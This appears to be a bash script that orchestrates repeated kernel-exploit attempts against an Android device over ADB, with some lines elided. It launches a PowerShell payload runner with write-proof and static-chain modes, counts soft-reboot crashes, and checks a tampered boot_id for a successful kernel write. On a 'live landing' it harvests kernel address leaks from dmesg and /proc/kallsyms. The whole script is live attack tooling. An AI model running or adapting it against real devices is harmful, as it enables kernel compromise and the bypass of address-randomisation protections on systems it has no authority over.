#!/bin/bash
# Observable UMASK campaign: every attempt reports its stage tail; stops on
# success, on 2 consecutive same-class crashes, or MAX attempts.
...
for attempt in $(seq 1 "$MAX"); do
  ...
  t=$(gettemp); [ -z "$t" ] && t=0
  if [ "$t" -ge 750 ]; then echo "HOT ${t:0:2}.${t: -1}C — cooling to <=50C"; while :; do sleep 120; t=$(gettemp); [ -z "$t" ] && t=0; [ "$t" -le 500 ] && break; done; fi
  ...
  tag=$(powershell -ExecutionPolicy Bypass -File fire_mode.ps1 -ModeEnv "MODE4_WRITE_PROOF=1 WRITE_PROOF_TARGET=fops MODE4_STATIC_CHAIN=1 MODE4_SC_UMASK=1 MODE4_SELFSTAMP=1 MODE4_PROOF=1" -TagPrefix "V${attempt}" 2>&1 | grep -aoE "CLASS=[A-Z]+" | head -1)
  ls_log=$(ls -t logs/aarif_pull/V${attempt}*_live_sync.log 2>/dev/null | head -1)
  echo "A$attempt: $tag | stage-tail: $(tail -2 "$ls_log" 2>/dev/null | grep -aoE 'STAGE [a-z_]+|PROOF [a-z_=0-9-]+' | tail -2 | tr '\n' ' ')"
  post=$("$ADB" -s 192.168.1.108:5555 shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  if echo "$post" | grep -q "80ff-ffff"; then echo "A$attempt: *** LIVE LANDING — HARVEST ***"; "$ADB" -s 192.168.1.108:5555 shell 'dmesg 2>/dev/null | grep -iA8 "virtual kernel memory" | head -10; head -3 /proc/kallsyms 2>/dev/null' > slide_harvest.txt 2>&1; cat slide_harvest.txt; exit 0; fi
  if [ "$tag" = "CLASS=SOFTBOOT" ]; then consec_crash=$((consec_crash+1)); else consec_crash=0; fi
  [ "$consec_crash" -ge 2 ] && { echo "STOP: 2 consecutive softboots"; exit 1; }
done
